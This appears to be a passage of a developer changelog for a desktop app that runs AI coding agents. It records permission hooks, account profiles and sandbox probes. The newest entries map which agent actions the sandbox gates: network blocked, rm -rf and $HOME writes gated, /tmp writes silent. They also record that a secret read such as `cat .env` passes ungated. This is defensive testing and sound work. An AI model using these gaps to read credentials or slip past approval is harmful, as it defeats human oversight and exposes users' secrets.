# Changelog

## 1.4.33 - the Codex runner validates its own payloads, and the sixth defect was in its first line

`esquema.mjs` checks every outgoing request against Codex's generated schema before it
reaches the wire — the one document in this runner its author did not write. Unknown
properties are errors even where the schema omits `additionalProperties: false`: for a
payload we SEND, a field the server does not know is a typo, a rename or a guess.

**It found a sixth defect on its first run, and that one invalidated a day of
measurements.** The runner had been sending `sandboxMode` to `thread/start` since its
first line. The field does not exist — it is `sandbox` — so the server discarded it in
silence. The policy this engine believed it was setting was never set, and every earlier
observation described Codex's *default*. **A wrong field does not fail; it vanishes.**

Two conclusions flipped once the field was right, and both tables were rewritten:

- **Network is not gated, it is BLOCKED.** The earlier card came from the default
  sandbox. Under `workspace-write`, `curl` runs inside the sandbox and dies on DNS with
  nobody asked. Nothing leaves — and nothing is shown either.
- **The boundary is the sandbox's writable set, not the project.** `workspace-write`
  includes `/tmp`, so a turn writes there with no card. Measurement M only reproduced
  once its target moved to `$HOME` — the same `/tmp` trap that had already broken the
  startup ruler's probe earlier the same day, in a different instrument.

Measured and unchanged: `rm -rf` gets a card (Codex gates destructive commands itself,
which an earlier version of the doc denied), writes inside the project do not — matching
`claude-runner` on Auto — and a write to `$HOME` gets a card whose rejection holds.

🔴 **The one gap that stays: `cat .env` is not gated.** `claude-runner` blocks a secret
read at every level through `caminhoProibido()`; Codex hands the value back. This runner
cannot close it — `item/started` arrives after the command begins — and there is no
execpolicy surface to force a prompt: `config/read` exposes only `approval_policy`,
`approvals_reviewer` and `shell_environment_policy`, and `execpolicy` exists solely as an
amendment Codex proposes. That "never" is now measured rather than assumed.

`install.sh` **regenerates** the schema from the Codex actually installed
(`codex app-server generate-json-schema`), falling back to the repo copy only for an
older CLI — and printing which one it used. A vendored schema goes stale on the next
Codex release, and a stale schema in a validator rejects fields that became valid while
accepting ones that stopped being: the same "answers something plausible" failure this
guard exists to end. Keep the command, not the derived state.

Record, with every row marked 🔬 live or 📋 schema:
[`docs/code/MOTOR-CODEX-20260909.md`](docs/code/MOTOR-CODEX-20260909.md).

## 1.4.31 - the Codex engine gets a runner, one honest level and a sandbox ruler that refuses to start
## 1.4.32 - the Codex engine gets a runner, one honest level and a sandbox ruler that refuses to start

Slice 1 of a third Code-mode engine: `codex-runner/` drives `codex app-server --stdio`
and emits the same NDJSON as `anna` and `claude-runner`, so it is drop-in behind the
bridge. **Nothing in the product reaches it yet** — `code_bridge.rs` does not know the
`codex` engine and the web toggle is still two-state. Slices 2 and 3 wait on Code-mode
identity and persistence.

### 🔴 The design changed once, because the first one was inferred instead of measured

The engine was first designed on `codex exec --json` and rejected: it has no
per-action approval at all. The second design chose `app-server` **because the schema
carries `execCommandApproval` and `applyPatchApproval`** — and that inference was
wrong. A message existing in a protocol is not the same as it being sent. Measured
live, under three policies including `askForApproval.granular` with every flag set,
`echo hello` **ran with no card every time**. Codex's own execpolicy decides what is
trivially safe and an integrator cannot disable it.

What Codex does guarantee, and what measurement M proved live, is the **boundary**:
asked to write outside the workspace root it emitted `execCommandApproval` with its
own reason, the rejection held, and the file was never created.

So the engine ships with one level, **"Sandbox"**, and a promise stated with its hole:
*inside the project writes do not ask; at the boundary you get a card.* Manual/Edit/Auto
would be three labels over one behaviour — the approval pill lying three ways. The
comparison with `claude-runner`'s Auto is in the doc and is not flattering to either
side: **Auto also allows writes inside the project without a card.** Where they differ
is network egress, destructive `Bash` and secret reads, which Auto always gates.

`askForApproval.granular` was dropped with it: it needs the `experimentalApi`
capability on top of an already experimental app-server, and it changed nothing.
Paying two experimental dependencies for a guarantee neither delivers is the worst
trade on the table.

### The startup ruler, and why it took two corrections

`provarQueOSandboxSegura()` refuses to start the engine unless the sandbox actually
stops a write outside the project. It uses `command/exec`, which runs in the server
sandbox without creating a thread or turn — no inference, no turn latency, once per
spawn. Reversion-proven: sandbox on → starts; `dangerFullAccess` → exits 3 with the
reason; restored → starts.

Both corrections came from that reversion proof **failing**, and both are the point:

- The first probe wrote to the workspace's parent under `/tmp`, which
  `workspace-write` allows by design — so the ruler passed with the sandbox off.
  Always green is worse than absent, because it looks like a guard. `$HOME`
  discriminates: the user owns it, so a failure there can only be the sandbox.
- The runner read host input **before the probe finished** — `{"type":"exit"}` shut it
  down mid-probe, and a turn would have run before the sandbox was ever proven. Host
  input is now wired only after the ruler passes. A ruler the engine can outrun is
  not a ruler.

### Five defects, one signature

Found by running, not by reading: the turn ended on the `turn/start` ack (one line of
output, exit 0 — success-shaped); `usage` read a field `turn/completed` does not have
(`tokens: 0` forever); the error text was read from the wrong level and printed
`unknown error`, discarding the only copy of the diagnosis; any `error` ended the
turn, **killing a healthy one mid-reconnect** and blaming the model; and
`msg.id && msg.decision` dropped the decision for `id: 0` — the app-server numbers its
requests from zero, so the **first card of every session hung forever**, looking like a
freeze.

> **The arithmetic was right and the shape was invented**, five times. A green unit
> suite proved nothing about any of them: it asserted the shape the author made up,
> with data made up in the same shape. Slice 2 validates payloads against the 39
> generated schema files before sending — that is what these five cost.

Full record with provenance marks (🔬 live / 📋 schema):
[`docs/code/MOTOR-CODEX-20260909.md`](docs/code/MOTOR-CODEX-20260909.md).
## 1.4.31 - the About window reads the server version again, and the compatibility gate wakes up

**Seen by the owner on 09/09/2026**, in this client's About window:
`ShvIA servidor —`. The row was there and empty, and finding out why turned up a
second consumer of the same broken source that matters more than the row.

### Why it was empty

Two sources, and **both are absent on the screen the owner was on**: the footer
`.account-mini__version` exists only in the chat screen's Blade, and the window
was on `/painel`; and the live source was `GET /api/v1/health`, which answers
**401** in production because `HEALTH_TOKEN` is set there. Measured against
`ai.shvia.org`. That is why the field looked intermittent rather than broken.

### 🔴 The gate was dead, and nothing said so

`VERSION_GATE_JS` reads `clients.desktop` from the same endpoint to warn a shell
older than the server's `min_version` (D6 / ADR-018). It treats a non-ok response
as *"old server → no-op"* and returns quietly — so since `HEALTH_TOKEN` was
switched on, that gate has been **protecting zero** in production. A shell below
the minimum would never see the notice, and the silence was indistinguishable
from "you are up to date".

### What changed

Both consumers now call `GET /api/v1/version` (ShvIA 2.110.226), authenticated
with the same Bearer the web app uses, falling back to `/api/v1/health` for a
server older than that route — where it is still public, which was the premise
when this code was written.

**The helper is duplicated on purpose, and the duplication is guarded.** The gate
and the modal are separate injected IIFEs; neither sees the other. So
`versaoDoServidor` exists twice between markers, and
`as_duas_copias_do_helper_sao_identicas` extracts both and demands they match byte
for byte — fixing one and forgetting the other goes red here instead of in
production. A second test asserts both ask for the new route first: presence of
the new one, not absence of the old, because `/health` is still the legitimate
fallback.

Proven by reversion: making the copies differ reddens the first test; pointing the
modal back at the old route alone reddens the second.

Entradas no formato da mensagem de commit (`versão - comentário`, AGENTS.md),
mais recente primeiro. É daqui que a skill COMMITTER tira a mensagem (AGENTS.md §PS).

## 1.4.30 - the archived proposal points at its diagram by the name the diagram has here

The proposal was renamed when it moved out of the route repository on 08/09/2026
(`claude-account-profiles.md` → `CONTAS-CLAUDE-proposta-20260905.md`), and the `.svg`
beside it was renamed with it. The image reference in the body kept the old name, so the
diagram rendered as a broken image — the archived reasoning lost the picture that carries
half of it.

The header note added during the move already used the new name, which is why the header
looked right while line 45 did not. Renaming a file and rewriting the links that point *at*
it is one move; the links *inside* it are a second one, and this is the half that was
missed.

## 1.4.29 - `npm run contas` registers the accounts this machine already has

The Settings screen is the destination; this is the step before it, and it is meant to be
thrown away when that lands. 1.4.28 made a credential profile expressible and nothing in the
product writes one — the alternative was hand-editing JSON.

It asks the **shell** which of its functions switch Claude account, exactly as the native
side does, and applies the same narrow rule to their bodies: one literal assignment, quoted
or not, expanding inside `$HOME` with nothing but `$HOME` or `~`. Anything computed is
dropped, never guessed. It reads no credential and creates no directory.

**Two refusals, and both are the point:**

- 🔴 **An app older than 1.4.28.** Before that the `var` field does not exist, so a
  credential profile would be applied as `CLAUDE_CONFIG_DIR` — handing the client a blank
  configuration home while the screen keeps naming the account the person picked. Writing
  would look like it worked and break the next turn. The version is read from the installed
  bundle, and the comparison was checked on eight values either side of the boundary.
- 🔴 **The app open.** It rewrites the registry when the account changes, so a write now
  would be lost without a trace.

It **merges**: an entry written by hand survives, and so does a label the person edited —
the default label is the alias, and this code has no business inventing a nicer one.

Nothing is written without `--aplicar`; the bare run prints what it found and the file it
would produce.

**A régua do F-22 cobrou no caminho, e a medição vale registrar.** O bump para 1.4.29 cruzou
a tolerância de 25 patches e a `prova:doc` reprovou o `.continue/estado-atual.md`, que dizia
1.4.3 no cabeçalho — e **1.1.19 no corpo**, dezoito versões atrás do cabeçalho já atrasado.
Quarto saneamento manual do mesmo arquivo. A régua mede o cabeçalho e o corpo estava pior:
ela pega a distância, não a mentira, e neste caso a distância bastou.

## 1.4.28 - a profile says which variable it switches accounts with, and the shell is asked instead of the person

The owner's answer to the account proposal was *"a mais fácil e menos problemática ao
usuário"*. Measured, that is neither typing a path nor renaming aliases: it is asking the
shell, which answers in half a second and imposes no convention.

### `var`, and why the pair is the answer

A profile now records **which** variable it sets. The two are not interchangeable:
`CLAUDE_CONFIG_DIR` moves the whole configuration home, `CLAUDE_SECURESTORAGE_CONFIG_DIR`
moves the credential key and leaves the configuration shared. Storing a directory and
guessing the variable runs a turn under a configuration nobody chose — and on macOS hands
the client a blank home while the screen keeps naming the account the person picked.

Absent means `CLAUDE_CONFIG_DIR`: a file written before the field describes the original
mechanism, and reading it as anything else would change what every entry in the fleet means
on upgrade. Present but unrecognised is **not** a default — the entry is dropped.

🔴 **`cli_config` had to learn the difference too.** "Connect my CLI" writes `settings.json`
into the profile's home, and a securestorage profile **has no home of its own** — that is the
point of it. Writing there would put the file where the client never reads: the silent no-op
1.4.19 fixed for the other kind. Its destination is the shared home, which is the one it
actually uses.

### Detection: `claudeAccountsDetect` and `claudeAccountAdd`

The shell is asked which of its functions set a Claude account variable, and answers with
`{alias, var, dir, disponivel}` per candidate. Registration goes by **alias**.

⚠️ **A deliberate gesture, never the boot path.** The seed uses `is_dir()`, free and per
launch; this starts an **interactive** shell, which sources the person's own config.

🔴 **The fence moved in one direction only.** The path **leaves** for the screen, because
that is the only way the person can check the resolution picked the right account before
registering. What the page still cannot do is **send** one: registration carries the alias
and the native side resolves it on that same call. A compromised page that could name a
directory would point the agent's credentials wherever it liked.

**What is accepted from a function body is narrow on purpose:** a literal assignment,
quoted or not, expanding inside `$HOME` using nothing but `$HOME` or `~`. Anything computed
is dropped, never guessed — evaluating someone's shell is the line this module does not
cross.

**Proofs (93 Rust tests, was 88):** each profile sets the variable it declares; the long
variable name is not read as the short one it contains — the mistake that would classify
every credential profile as a configuration profile, invisibly; a computed, outside-`$HOME`,
empty or absent value is discarded; unquoted and `~` forms are accepted; and the parser reads
the shape the owner's Mac actually answers, captured from `zsh -ic 'whence -f claude-me'`.

**Not in this delivery:** the Settings UI. The native half is what makes the accounts
reachable at all — without it any screen would be decorative.

## 1.4.27 - the Claude Code engine gets a runbook, and the account proposal gets the owner's answer

**Why now.** On 08/09/2026 the engine was diagnosed from scratch on a machine it had never
run on. Three hypotheses were tried and discarded — a packaging regression, a GUI
environment problem, an SDK that needed its own token — before the real cause, and every one
of those steps was reproducible from the first minute. The owner asked for it to be written
down so the next machine does not pay the same evening.

### `docs/code/MOTOR-CLAUDE-DIAGNOSTICO.md`

Symptom first, and it opens with the one command that splits the problem in two:
`claude -p "responda apenas: ok"`. If the official client refuses too, the app is not the
suspect — and that single line would have saved the whole detour.

Then, per symptom: which **slot** each way of logging in writes to (the default one is the
only one the app reads, and a named account answering in the terminal proves nothing about
the app); why `claude-runner não encontrado` is an optional install and never a packaging
regression; why the account picker showing one entry is the seed working as written rather
than a regression; the end-to-end probe through the runner; and the environment workaround
with the cost it carries — the screen naming one account while another pays.

It points at [CONTAS-CLAUDE.md](docs/code/CONTAS-CLAUDE.md) for the mechanism instead of
repeating it.

### The proposal has the owner's answer to Question 2

*"tinha que ficar em configurações"*, with a field per account taking the alias name.
Recorded in `.continue/contas-claude-macos.md`, with what was measured about it:

- 🔴 **The alias cannot be executed.** `whence -w` says both are shell **functions**, so
  there is nothing to exec; and the body ends in `exec claude "$@"`, which launches the
  interactive CLI rather than the runner the app speaks NDJSON to. Typing `claude-me` in a
  field can never mean "run this".
- **What it contributes is one line**, and the shell hands it over when asked
  (`whence -f`). So the field takes the alias and the app resolves it **once**, at
  registration, into the variable and directory pair that gets stored — never the alias name.
- The second idea, canonical names (`claude-personal`/`claude-business`) seeded
  automatically, is recorded with the trap in it: it is today's weakness moved one level,
  and it leaves empty exactly the machine that produced this document. Both, then — the
  convention as the free default, the field as what stops it being coercive.

## 1.4.26 - the Claude Code account proposal is archived beside the document it became

`docs/code/CONTAS-CLAUDE.md` said it *"supersedes the proposal of 05/09/2026 that
circulated outside the repository"* — and the proposal sat, ignored by git, in the umbrella
`.continue/` of `~/x/SHVIA` (the `shvia-rota` repository, whose allowlist never named it).
A document that only exists on one disk is not superseded; it is one `rm` from gone.

- `docs/code/CONTAS-CLAUDE-proposta-20260905.md` + `.svg`: the proposal and its diagram,
  untouched but for a header that says what it is and points at the living document.
- `.continue/RETOMADA-CONTAS-CLAUDE-20260906.md`: the resumption note of 06/09, with a
  header stating what has closed since (PR #71 merged, worktree removed). What remains is
  the manual validation that needs a desktop session — which is exactly what `.continue/`
  is for.

Both indexes (`docs/README.md`, `.continue/README.md`) list them.


## 1.4.25 - Record the parallel carrier fix that master's 1.4.22 had already landed

The 1.4.21 commit bumped `version.md` and nothing else: `package.json`,
`package-lock.json`, `claude-runner/package.json`, `src-tauri/Cargo.toml`,
`src-tauri/Cargo.lock` and `src-tauri/tauri.conf.json` stayed at 1.4.20, and the CI's
`prova:bump` went red on 07/09 with *"6 carriers off"*. The `npm run version:sync` that
fixes it had been run and was sitting in the working tree for a day, uncommitted
(finding C1 of `REVISAO-20260908.md` in the route repository). The `pre-push` hook refuses
a repeated version against the remote, so 1.4.21 could not be completed in place — the
same subject the repository already used in 0.11.18 of `shvia-code` and 0.6.2 of
`shvia-site`.

**This was written offline as 1.4.22 and has been renumbered twice.** While it sat
unpushed, the 1.4.22 of `master` — *"the runner installer copies every file the runner
imports"* — ran the same `version:sync` inside its own bump and closed C1 there; its
`### Version carriers` section is that record. So the seven files were already in
agreement when this commit arrived: what it adds is the bump, not the reconciliation,
which is why its subject no longer claims the carriers catch up here. The first renumber
aimed at 1.4.23; by the time it was ready `master` had taken 1.4.23 **and** 1.4.24 (the
latter across four commits), so it landed at 1.4.25.

The entry is kept rather than dropped because the log is where the work is: two sessions
branched off 1.4.21 and fixed C1 in parallel, neither seeing the other, and the duplicate
1.4.22 that resulted is worth being able to find later.

**The hook cannot catch this class, by construction.** `pre-push` compares one line of
`version.md` against the remote default branch, so it sees a repeated version only when
the *tip* repeats one. A duplicate buried inside unpushed local history never reaches that
comparison, and the `commit-msg` hook — which does check the subject against
`version.md` — provably does not run during a rebase, as its own header says. What
actually refused the first push here was git, on non-fast-forward. Two sessions committing
against the same parent will keep minting the same number; the guard is a net under it,
not a lock.

## 1.4.24 - macOS keys Claude Code credentials by another variable, and the account picker never saw it

On the owner's Mac the account picker offers **one** entry, `Padrão do sistema`. Nothing is
broken: `semente()` seeds a named profile only when its directory exists, and the two names
it knows — `~/.claude-blue3` and `~/.claude-pessoal` — are not on this machine.
`contas-claude.json` is `{"contas": [], "selecionada": "padrao"}`, which is the honest
answer to what the seed was asked.

The seed was asked the wrong question. Measured 08/09/2026 (macOS 25.6, `claude` 2.1.265):
the owner's two accounts are behind shell **functions**, not aliases, and they export
**`CLAUDE_SECURESTORAGE_CONFIG_DIR`** — `~/.claude-cred-pessoal` and `~/.claude-cred-blue3`
— never `CLAUDE_CONFIG_DIR`. Both directories are empty, which is exactly right: on macOS
that variable is a **key string**, not a store, and the credential is in the Keychain.

### What the two variables do, read from the client

The Keychain service name is `Claude Code-credentials`, suffixed with
`-<sha256(dir)[0:8]>` where `dir` is `CLAUDE_SECURESTORAGE_CONFIG_DIR` if set, otherwise
`CLAUDE_CONFIG_DIR`, and unsuffixed when neither is set. **The two variables feed the same
key**; `CLAUDE_CONFIG_DIR` merely also moves the configuration home — settings, history,
`projects/`, `sessions/`. Checking presence only (never content, no `-w`, no prompt), this
Mac holds three logins: the unsuffixed default and the two suffixes derived from the
`-cred-` directories. The suffixes derived from `~/.claude-blue3` and `~/.claude-pessoal`
are absent.

### Why widening the hardcoded list would not have worked

Registering `~/.claude-cred-blue3` as a `dir` makes `aplicar()` export it as
`CLAUDE_CONFIG_DIR`, and the result differs by operating system. On Linux the directory has
no login and the turn dies with `Not logged in` (measured 05/09). On macOS the hash is the
same whichever variable carries the path, so the client finds the **right credential** and
pairs it with a **blank configuration home** it populates on the spot — no error, account
right, settings and history silently forked. One entry, two wrong answers. Which variable a
profile means has to be recorded, not inferred from a path.

### And the Linux discriminator does not reproduce here

`--modelos` distinguishes nothing on macOS/2.1.265: under a scrubbed environment the
catalogue is identical with and without the variable. Worse, the first comparison was run
from inside a Claude Code session and *did* show a difference — the session's own
`ANTHROPIC_BASE_URL` and `CLAUDE_CODE_*` host-auth variables, not the variable under test.
Both facts are written down so the next person does not re-propose the method or repeat the
contaminated measurement.

Documentation only — no behaviour changes in this version. The module docblock, which
stated the alias layout as fact, is corrected to describe the machine that was actually
measured. The proposal for what to build (which variable a profile names, how a profile
gets registered at all, how the screen should report a profile with no login) is WIP in
`.continue/contas-claude-macos.md` and is **not decided**.
## 1.4.23 - claude-runner is a separate optional install, in the comments and on the screen

`code_bridge.rs:157` claimed that "o `anna` e o `claude-runner` vêm EMBUTIDOS no app
instalado". Half of that was false, and it is the expensive half.

Measured on 08/09:

| | declared in `tauri.conf.json` | in `build-local.sh` | in `/Applications/ShvIA.app/Contents/MacOS/` |
|---|---|---|---|
| `anna` | `externalBin: ["binaries/anna"]` | staged by `[D5]` / `stage-anna.mjs` | present |
| `claude-runner` | absent | no step | **absent** |

The runner has never been packaged. It arrives through `claude-runner/install.sh`, which
leaves a wrapper in `~/.local/bin` — a **separate and optional** install, which is why
`resolve_bin`'s step (1), "next to the app's executable", can only ever hit for `anna`.

🔴 **What the wrong comment cost.** On a machine without the runner the app says
`claude-runner não encontrado`. Read next to a comment promising the binary ships inside
the bundle, that sentence describes a **packaging regression** — something that fell out
of the installer — and the diagnosis goes looking for it in the build. It is the second
time in two days that this message pointed a diagnosis at the wrong layer; the **1.4.22**
entry, directly below, is the first. Documentation that contradicts the code is the
failure mode `CLAUDE.md` names, and here it had already been paid for twice.

### The comments now state what is measurable

`code_bridge.rs:157` says which engine is embedded, which one is not, and how the second
one arrives. The `resolve_bin` docblock — correct but silent on the point — now says
outright that the bundled-beats-PATH rule is an `anna` rule, and that a missing runner is
an optional install that was never done, **never** a packaging regression.

### And the screen stops being a dead end

Two paths discover the runner's absence, and only one of them said what to do about it:

- `spawn` (`:720`) — named `install.sh` and `claude login`. Fine.
- the catalogue (`claude_models`, `:340`) — answered `claude-runner não encontrado`, dry.

The dry one is the one the user actually reads. The page requests the model list to draw
the selector, so it fires **before** any turn exists: whoever has not installed the runner
hits the catalogue first, and got the message that offered no way out, while the sentence
that would have helped sat on a path they had not reached yet.

Both now return `ERRO_RUNNER_AUSENTE`, one constant instead of two literals, so the next
edit to the wording cannot fix one path and leave the other behind. The other two
catalogue failures stay distinct — `resposta do claude-runner ilegível` and `falha ao
listar modelos` — because "not installed", "installed and unreadable" and "would not
start" are three different diagnoses and 1.4.22 is what happens when they blur.

Portuguese text, kept: this is user-facing product copy, the one carve-out to the
English-only rule.

Green on 08/09: `cargo test` 88 passing, `cargo clippy --locked --all-targets -D warnings`
silent, and `prova:politica` / `prova:runner-version` / `prova:bump` / `prova:doc` all OK.

## 1.4.22 - the runner installer copies every file the runner imports, and proves the install loads

`claude-runner/install.sh` copied three files — `claude-runner.mjs`, `package.json`,
`package-lock.json`. Since the **1.4.7** (03/09) the runner also imports `./politica.mjs`,
and that commit is the one that last touched the installer without adding the file to the
`cp`. Every install since then finished by printing `✓ claude-runner instalado` and then
died on the first call:

```
Error [ERR_MODULE_NOT_FOUND]: Cannot find module '…/shvia-claude-runner/politica.mjs'
```

🔴 **And the screen blamed the wrong thing.** `code_bridge.rs:340` answers a failed
`--modelos` with `claude-runner não encontrado`, which is the message for a **missing
binary**. The binary was there and executable; what was missing was a file next to it. On
08/09 that sent a diagnosis looking for a packaging regression in a Modo Code delivery that
had nothing to do with it.

### The fix, and the guard that keeps it fixed

The `cp` gains `politica.mjs`. One line — and one line is exactly what came back five days
ago, so it does not travel alone: before printing `✓`, the installer now **imports the
installed module**, which exercises the whole chain of local imports. A new local import
that nobody adds to the `cp` now fails in the installer, naming the missing file, instead
of failing on somebody's screen under a message about a binary.

Proof by reversion, run on 08/09: with the old `cp` line restored and the guard in place,
the installer exits **1** and prints the missing path. With both, `✓` and `--modelos`
answering the catalogue (Agent SDK 0.3.258).

### Version carriers

`npm run version:sync` ran with the bump, so the six carriers and `version.md` agree at
1.4.22 — `prova:bump` was **red on `master`** before this (carriers at 1.4.20, `version.md`
at 1.4.21), which is finding C1 of the 08/09 fleet review, and it goes green here.

## 1.4.21 - the git hooks arrive from repodocs and are enabled here

Both hooks of the standard now run here: `commit-msg`, which checks the shape of
the subject (`X.Y.Z - description`), refuses a Conventional Commits prefix and a
vague message, **and checks that the subject's `X.Y.Z` is the version this commit
carries in `version.md`**; and `pre-push`, which compares the local `version.md`
against the remote default branch for a repeated version and for one that moves
backwards.

The hook does **not** check the language and could not: what it measures is the
shape and the number.

Until now the commit rule lived here only as prose in `CLAUDE.md`, and prose is
what gets forgotten at the end of a long session. On 07/09/2026 the hooks were
enabled in 3 clones out of 58, and two repositories of the fleet were measurably
off the norm with nothing to say so.

Escape hatch, declared in both: `REPODOCS_NO_HOOK=1`. It exists so the hooks stay installed —
a guard with no declared bypass gets bypassed with `--no-verify`, which switches
off every guard at once. In a fresh clone, enable them with
`git config core.hooksPath tools/git-hooks`.

## 1.4.20 - Record the per-account turn that proves the config directory decides who authenticates

`--modelos` is a control channel: it proves the variable reaches the child, not that the
**authentication** changes. So the account feature shipped in 1.4.16 with its central claim
argued rather than measured.

Measured now, with the same argv and environment the spawn builds
(`--cwd <project> --aprovacao manual` plus `CLAUDE_CONFIG_DIR`), asking for one word:

| `CLAUDE_CONFIG_DIR` | answer | tokens |
|---|---|---|
| `~/.claude-blue3` | `ok` (model `claude-opus-5[1m] · anthropic (assinatura)`) | 6 |
| `~/.claude-pessoal` | `ok` (same) | 6 |
| a directory with no login | `Not logged in · Please run /login` | **0** |

**The third row is what closes the argument.** The first two on their own could be one
account answering twice — same subscription tier, same model, same everything. The negative
control is the only line that distinguishes "the variable is honoured" from "the variable is
read and ignored".

⚠️ It also measures exactly what `disponivel` does **not** promise: a directory that exists
with no login is `disponivel: true` and still runs no turn. The error arrives from the
official client, at turn time, because that is who knows. Nothing here tries to guess it
earlier.

Twelve tokens of subscription quota were spent to produce this table, on the owner's
explicit go-ahead. Documentation only; no behaviour changed.

## 1.4.19 - "Connect my CLI" writes into the selected account, not a fixed path

`cli_config.rs` writes the three `ANTHROPIC_*` variables into the Claude Code
`settings.json` so the CLI talks to the ShvIA gateway (ADR-026). The destination was
`~/.claude/settings.json`, hardcoded — which was correct until 1.4.16, when Code mode
started choosing between account profiles.

🔴 **From that release it was wrong, and wrong in the silent way.** Someone on
`Empresa · Blue3` clicking "Gravar no meu computador" configured the *other* account's
directory: the `env` block landed in `~/.claude` while Code mode kept reading
`~/.claude-blue3`. No error, nothing to see, and the discovery would come from someone
asking why the configuration "did not take".

This is Claude's own configuration, so it follows Claude's account profile. `padrao` still
means `~/.claude`.

- The directory comes from the **native** registry, never from the page — the page still
  sends only values and does not know profiles exist, so ADR-026 holds intact.
- The native confirmation dialog already shows the exact path before writing, so whoever is
  on the company account sees `~/.claude-blue3/settings.json` and decides.
- **Continue and `~/.shvia` do not follow it.** They are not Claude's; making its profile
  move someone else's file would be a side effect.
- A profile that does not resolve **fails loudly**. Writing to `~/.claude` as a consolation
  would configure an account the user did not choose — the same reasoning as the spawn.

Two cases in `cli_config` cover it: the destination still lands inside `$HOME` with a
profile, and two profiles never share a destination.

## 1.4.18 - Give CI the sidecar stand-in its Rust build has always needed

🔴 **`cargo test` in `ci.yml` had never once run.** Not "was failing recently" — never, in
any of the 13 runs since CI landed in 1.4.1. `src-tauri/binaries/` is gitignored on purpose
(the `anna` sidecar depends on the build machine, ADR-021, and is staged by
`stage-anna.mjs`), but `externalBin` in `tauri.conf.json` makes the Tauri build script
*require* the file. On a clean checkout the crate does not compile:

```
resource path `binaries/anna-x86_64-unknown-linux-gnu` doesn't exist
```

Reproduced here with a fresh `git clone` of this repository — same message, and the suite
runs 89/89 the moment an empty file with the right name exists.

⚠️ **This is the third guard found stacked behind another in one day**, and the shape is
the same every time: the carriers step failed first (since 1.4.9), so CI never reached
`cargo test`; fixing that in 1.4.13 exposed an unpinned action; fixing that in 1.4.15
exposed this. **A red run says one thing and hides the rest** — the first failing step is
the only one anyone reads, and nothing in the output distinguishes "the later steps are
fine" from "nobody has looked at them since they were written."

The claim in `CLAUDE.md` that "testes (Rust/lint) já rodam via `.github/workflows/ci.yml`
desde 01–02/09/2026" was therefore never true of the Rust half. `npm run prova:politica`
and the version-carrier proof did run; `cargo test`, `clippy` and `cargo deny` did not.

The stand-in cannot leak into anything: nothing in CI executes the sidecar, and CI does not
package — the release build is local by decision (`docs/build.md`).

## 1.4.17 - Name the engine that actually failed to start

`spawn` answered `falha ao iniciar anna` whichever engine it had just tried, so a failure
in the Claude Code engine sent whoever was diagnosing it to look at the other binary.

It matters more now than it did yesterday: this is the message that shows up when an
account profile fails to launch (ADR-033), and account profiles are the newest reason for
a spawn to fail. The string uses `exe_base`, which is already the variable that chose the
binary two lines above.

## 1.4.16 - Model discovery and spawn run under the selected Claude account

Code mode could only ever reach whichever account the CLI's default directory held. The
owner's two subscriptions live behind two shell aliases (`claude-b3` → `~/.claude-blue3`,
`claude-me` → `~/.claude-pessoal`), and the Desktop never goes through a shell — it spawns
`claude-runner` directly, with no `CLAUDE_CONFIG_DIR` at all.

- `src-tauri/src/contas_claude.rs` is the registry: `contas-claude.json` in the app config
  directory, next to `pastas-autorizadas.json`. The two known profiles are seeded **only
  when their directory already exists**; nothing is created, and no shell alias is parsed.
  A second machine registers its own path by hand, and every entry is revalidated on each
  read (id shape, absolute path inside `$HOME`).
- The bridge gains `claudeAccounts` and `claudeAccountSelect`; `claudeModels` takes an
  `accountId`; `spawn` takes one and echoes the resolved id and label back. **No path
  crosses the bridge** — not in, not out, not in an error.
- `claude_models` now *requires* the resolved directory as an argument. While it asked for
  nothing, it and `spawn` were two independent routes to the same binary and nothing made
  them agree on the account — and the catalogue is per subscription, so disagreeing means
  offering a model on screen that the turn will refuse.
- `CLAUDE_CONFIG_DIR` is set with `Command::env`, never `std::env::set_var`: two windows
  can hold two accounts at once.
- An unknown id, or a profile whose directory is gone, **fails loudly**. There is no
  fallback arm to the default account.

🔬 **Why the missing-directory case is a refusal and not a pass-through.** Measured with
`--modelos` under three directories: both real profiles answer with the subscription
catalogue, and an **empty** directory answers with `$5/$25 per Mtok` — the SDK created
`.claude.json`, `projects/`, `sessions/` and `backups/` inside it and carried on without a
subscription rather than complaining. A profile whose folder had moved would have run the
turn outside the subscription, silently, with the right account name on screen.

The web half (the CONTA selector) ships separately and is gated on `recursos.conta`, so an
older shell keeps today's control row instead of a selector it would ignore.

## 1.4.15 - Pin the release workflow's checkout by SHA, like every other action

`toda_action_do_ci_esta_pinada_por_sha` has been red since it was written in 1.4.7:
`release.yml` has carried `actions/checkout@v5` since 1.3.4, and a moving tag is a third
party who can change what runs with `contents: write` in this repository.

⚠️ **The guard never got to say so.** `cargo test` runs after "Portadores de versão
alinhados" in `ci.yml`, and that step had been failing since 1.4.9 — so CI stopped before
reaching the test, eight runs in a row. Fixing the carriers in 1.4.13 is what made this
visible. A guard behind a failing guard reports nothing, and the run is red either way, so
nothing in the output says a second one is also broken.

Pinned to `fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09` (`v5.1.0`, resolved through the GitHub
API), with the version in the comment the guard also requires.

## 1.4.14 - Normalize subscription auth before every SDK entry point

The block that strips `ANTHROPIC_API_KEY` from the runner process sat *below* the
`--modelos` branch, and that branch calls `process.exit()`. So model discovery went
through `query()` with the key still in the environment while turns went through it
without — two authentications in one runner, decided by which flag was passed.

🔬 **Measured here, with a deliberately fake key in the environment.** Same command,
before and after, differing only in this ordering:

```
before: "description":"Use the default model (currently Opus 5 (1M context)) · $5/$25 per Mtok"
after:  "description":"Opus 5 with 1M context · Best for everyday, complex tasks"
```

The catalog the MODEL selector shows was the **pay-per-token** one while the session that
actually ran was the subscription. Nothing failed; the list was plausible either way, which
is exactly why nobody would have gone looking.

The block moves above the SDK's dynamic import, so it covers `--modelos` and `runTurn`
alike. `--version` stays above it: it answers without the SDK at all, and stripping an
environment variable to print a version number is work with no reader.

## 1.4.13 - Restore the edit-tool set the permission hook lost

`claude-runner.mjs` passed `edicao: EDIT_TOOLS` to the permission decision, and
`EDIT_TOOLS` was neither declared nor imported anywhere. The definition
(`new Set(["Write","Edit","MultiEdit","NotebookEdit"])`) left in 1.4.7, when the policy
was extracted into `politica.mjs`; the reference stayed behind.

🔴 **The consequence was not cosmetic.** `preToolUse` builds that object literal *before*
calling `decidir()`, and an undeclared name in ESM is a `ReferenceError` — so the hook
threw on **every tool call, at every approval level**. The `PreToolUse` hook is the whole
permission policy of Code mode (ADR-032): it is what emits `gate_request` and makes the
approval card appear. It was off the air for two days and nothing said so.

**Why no proof caught it.** `politica.test.mjs` declared its own local copies of the read
and edit sets and exercised `decidir()` with those, so it never touched the file where the
